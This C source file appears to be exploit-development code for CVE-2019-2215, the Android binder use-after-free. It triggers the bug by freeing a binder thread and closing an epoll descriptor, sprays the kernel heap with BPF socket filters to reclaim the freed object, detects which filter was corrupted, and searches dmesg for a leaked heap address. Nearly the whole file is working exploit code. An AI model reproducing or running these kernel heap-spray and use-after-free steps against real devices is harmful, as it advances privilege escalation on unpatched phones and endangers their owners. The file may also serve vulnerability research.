/*
 * bpf_detect.c — BPF corruption detection for CVE-2019-2215
 *
 * Instead of xattr (transient), use BPF filter spray (persistent) for
 * reclaim. After close(epfd) corrupts the BPF data at offsets 48-55,
 * detect which filter is corrupted by testing packet acceptance.
 *
 * On 3.10, corrupted BPF instruction triggers WARN_RATELIMIT to dmesg,
 * logging the heap address in the 'k' field.
 *
 * Build: .\qemu\build-arm.bat src\bpf_detect.c bpf_detect
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/filter.h>
#include <netinet/in.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <unistd.h>

#define BINDER_SET_MAX_THREADS  _IOW('b', 5, uint32_t)
#define BINDER_THREAD_EXIT      _IOW('b', 8, int)

/* ========== TEST 1: Socket type availability ========== */
static void test_sockets(void) {
    printf("=== TEST 1: Socket availability ===\n");

    int s;

    s = socket(AF_INET, SOCK_DGRAM, 0);
    printf("  AF_INET SOCK_DGRAM: %s (fd=%d)\n",
           s >= 0 ? "OK" : strerror(errno), s);
    if (s >= 0) close(s);

    s = socket(AF_INET, SOCK_STREAM, 0);
    printf("  AF_INET SOCK_STREAM: %s (fd=%d)\n",
           s >= 0 ? "OK" : strerror(errno), s);
    if (s >= 0) close(s);

    s = socket(AF_PACKET, SOCK_DGRAM, 0);
    printf("  AF_PACKET SOCK_DGRAM: %s\n",
           s >= 0 ? "OK" : strerror(errno));
    if (s >= 0) close(s);

    s = socket(AF_INET, SOCK_RAW, 1);
    printf("  AF_INET SOCK_RAW: %s\n",
           s >= 0 ? "OK" : strerror(errno));
    if (s >= 0) close(s);

    /* Test BPF on AF_INET UDP */
    s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s >= 0) {
        struct sock_filter insns[] = {
            { BPF_RET | BPF_K, 0, 0, 0xFFFF },
        };
        struct sock_fprog prog = { .len = 1, .filter = insns };
        int r = setsockopt(s, SOL_SOCKET, SO_ATTACH_FILTER, &prog, sizeof(prog));
        printf("  BPF on UDP: %s\n", r == 0 ? "OK" : strerror(errno));

        /* Test send+recv through BPF */
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
        addr.sin_port = htons(0);  /* kernel assigns */
        r = bind(s, (struct sockaddr*)&addr, sizeof(addr));
        printf("  bind(loopback): %s\n", r == 0 ? "OK" : strerror(errno));

        socklen_t len = sizeof(addr);
        getsockname(s, (struct sockaddr*)&addr, &len);
        printf("  assigned port: %d\n", ntohs(addr.sin_port));

        /* Send a packet to self */
        int s2 = socket(AF_INET, SOCK_DGRAM, 0);
        if (s2 >= 0) {
            char msg[] = "HELLO";
            ssize_t sent = sendto(s2, msg, sizeof(msg), 0,
                                  (struct sockaddr*)&addr, sizeof(addr));
            printf("  sendto: %zd (%s)\n", sent,
                   sent > 0 ? "OK" : strerror(errno));

            /* Try to recv */
            char buf[64];
            struct timeval tv = { .tv_sec = 0, .tv_usec = 100000 };
            setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
            ssize_t got = recv(s, buf, sizeof(buf), 0);
            printf("  recv: %zd (%s) data='%.*s'\n", got,
                   got > 0 ? "OK" : strerror(errno),
                   (int)(got > 0 ? got : 0), buf);
            close(s2);
        }
        close(s);
    }
    printf("\n");
}

/* ========== TEST 2: BPF spray + UAF + detection ========== */
static void test_uaf_bpf(void) {
    printf("=== TEST 2: BPF spray + UAF + corruption detection ===\n");

    /* Pin to CPU 0 */
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(0, &mask);
    sched_setaffinity(0, sizeof(mask), &mask);

    /* Create spray sockets with BPF filters (26 insns = kmalloc-256) */
    #define NSPRAY 80
    int spray_sock[NSPRAY];
    int spray_port[NSPRAY];

    struct sock_filter insns[26];
    for (int j = 0; j < 25; j++) {
        insns[j].code = BPF_LD | BPF_IMM;
        insns[j].jt = 0; insns[j].jf = 0;
        insns[j].k = 0;
    }
    insns[25].code = BPF_RET | BPF_K;
    insns[25].jt = 0; insns[25].jf = 0; insns[25].k = 0xFFFF; /* accept all */

    int created = 0;
    for (int i = 0; i < NSPRAY; i++) {
        spray_sock[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if (spray_sock[i] < 0) {
            printf("  socket %d failed: %s\n", i, strerror(errno));
            break;
        }

        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
        addr.sin_port = htons(0);
        if (bind(spray_sock[i], (struct sockaddr*)&addr, sizeof(addr)) < 0) {
            printf("  bind %d failed: %s\n", i, strerror(errno));
            close(spray_sock[i]);
            spray_sock[i] = -1;
            break;
        }

        socklen_t len = sizeof(addr);
        getsockname(spray_sock[i], (struct sockaddr*)&addr, &len);
        spray_port[i] = ntohs(addr.sin_port);

        /* Set short recv timeout */
        struct timeval tv = { .tv_sec = 0, .tv_usec = 10000 }; /* 10ms */
        setsockopt(spray_sock[i], SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

        struct sock_fprog prog = { .len = 26, .filter = insns };
        setsockopt(spray_sock[i], SOL_SOCKET, SO_ATTACH_FILTER, &prog, sizeof(prog));
        created++;
    }
    printf("  Created %d spray sockets\n", created);

    /* Verify all filters accept packets */
    int sender = socket(AF_INET, SOCK_DGRAM, 0);
    char msg[] = "TEST";
    char buf[64];
    int pre_ok = 0;

    for (int i = 0; i < created; i++) {
        struct sockaddr_in dest;
        dest.sin_family = AF_INET;
        dest.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
        dest.sin_port = htons(spray_port[i]);
        sendto(sender, msg, sizeof(msg), 0, (struct sockaddr*)&dest, sizeof(dest));
        ssize_t got = recv(spray_sock[i], buf, sizeof(buf), 0);
        if (got > 0) pre_ok++;
    }
    printf("  Pre-UAF: %d/%d sockets receive OK\n", pre_ok, created);

    /* Setup binder UAF (NO BC_ENTER_LOOPER) */
    int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    if (bfd < 0) { printf("  binder open failed: %s\n", strerror(errno)); return; }
    uint32_t mx = 0;
    ioctl(bfd, BINDER_SET_MAX_THREADS, &mx);

    int epfd = epoll_create1(O_CLOEXEC);
    struct epoll_event ev = { .events = EPOLLIN };
    epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);

    /* FREE binder_thread */
    int thr = 0;
    ioctl(bfd, BINDER_THREAD_EXIT, &thr);

    /* Close epfd → UAF: remove_wait_queue on freed thread->wait */
    close(epfd);

    /* Check which filters are corrupted */
    int post_ok = 0;
    int corrupted = -1;

    for (int i = 0; i < created; i++) {
        struct sockaddr_in dest;
        dest.sin_family = AF_INET;
        dest.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
        dest.sin_port = htons(spray_port[i]);
        sendto(sender, msg, sizeof(msg), 0, (struct sockaddr*)&dest, sizeof(dest));
        ssize_t got = recv(spray_sock[i], buf, sizeof(buf), 0);
        if (got > 0) {
            post_ok++;
        } else {
            printf("  CORRUPTED: socket %d (port %d) — filter broken!\n",
                   i, spray_port[i]);
            corrupted = i;
        }
    }
    printf("  Post-UAF: %d/%d sockets receive OK (%d corrupted)\n",
           post_ok, created, created - post_ok);

    if (corrupted >= 0) {
        printf("\n  ✓ UAF CONFIRMED! BPF filter %d was reclaimed.\n", corrupted);
        printf("  Check dmesg for WARN_RATELIMIT with heap address.\n");
    } else {
        printf("\n  No corruption detected. Possible reasons:\n");
        printf("  - BPF filter didn't reclaim the freed slot\n");
        printf("  - Corruption was to data bytes that don't affect filter\n");
        printf("  - Thread wasn't actually freed\n");
    }

    /* Check dmesg for the WARN_RATELIMIT */
    printf("\n  Checking dmesg for BPF warnings...\n");
    fflush(stdout);
    FILE *p = popen("dmesg | grep -i 'unknown.*filter\\|unknown.*code\\|sock.*filter' | tail -5", "r");
    if (p) {
        char line[512];
        while (fgets(line, sizeof(line), p))
            printf("  dmesg: %s", line);
        pclose(p);
    }

    close(sender);
    close(bfd);
    for (int i = 0; i < created; i++)
        if (spray_sock[i] >= 0) close(spray_sock[i]);
    printf("\n");
}

/* ========== TEST 3: Sequential UAF verify (no race) ========== */
static void test_sequential_uaf(void) {
    printf("=== TEST 3: Sequential UAF (BPF reclaim + close(epfd)) ===\n");

    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(0, &mask);
    sched_setaffinity(0, sizeof(mask), &mask);

    /* BPF spray with AF_UNIX (these don't need to receive) */
    #define NSPRAY2 200
    int spray[NSPRAY2];
    struct sock_filter insns[26];
    for (int j = 0; j < 25; j++) {
        insns[j].code = BPF_LD | BPF_IMM;
        insns[j].jt = 0; insns[j].jf = 0; insns[j].k = 0x41414141;
    }
    insns[25].code = BPF_RET | BPF_K;
    insns[25].jt = 0; insns[25].jf = 0; insns[25].k = 0xFFFF;
    struct sock_fprog prog = { .len = 26, .filter = insns };

    for (int i = 0; i < NSPRAY2; i++) {
        spray[i] = socket(AF_UNIX, SOCK_DGRAM, 0);
        if (spray[i] >= 0)
            setsockopt(spray[i], SOL_SOCKET, SO_ATTACH_FILTER, &prog, sizeof(prog));
    }

    /* Setup binder UAF */
    int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    uint32_t mx = 0;
    ioctl(bfd, BINDER_SET_MAX_THREADS, &mx);

    int epfd = epoll_create1(O_CLOEXEC);
    struct epoll_event ev = { .events = EPOLLIN };
    epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);

    /* FREE */
    int thr = 0;
    ioctl(bfd, BINDER_THREAD_EXIT, &thr);
    printf("  BINDER_THREAD_EXIT done\n");

    /* Close epfd — accesses freed binder_thread->wait */
    printf("  Closing epfd (triggers UAF on freed thread->wait)...\n");
    close(epfd);
    printf("  close(epfd) completed (no crash = spinlock succeeded)\n");

    close(bfd);
    for (int i = 0; i < NSPRAY2; i++)
        if (spray[i] >= 0) close(spray[i]);

    printf("  Test passed — UAF access survived\n\n");
}

int main(void) {
    printf("=== BPF Corruption Detection for CVE-2019-2215 ===\n\n");

    test_sockets();

    /* Run sequential UAF in a fork (safety) */
    pid_t pid = fork();
    if (pid == 0) {
        alarm(5);
        test_sequential_uaf();
        _exit(0);
    }
    int status;
    waitpid(pid, &status, 0);
    if (WIFSIGNALED(status))
        printf("  Sequential UAF: CRASHED (signal %d)\n\n", WTERMSIG(status));

    /* Run BPF detection in a fork */
    pid = fork();
    if (pid == 0) {
        alarm(10);
        test_uaf_bpf();
        _exit(0);
    }
    waitpid(pid, &status, 0);
    if (WIFSIGNALED(status))
        printf("  BPF detection: CRASHED (signal %d)\n\n", WTERMSIG(status));

    printf("=== All tests done ===\n");
    return 0;
}
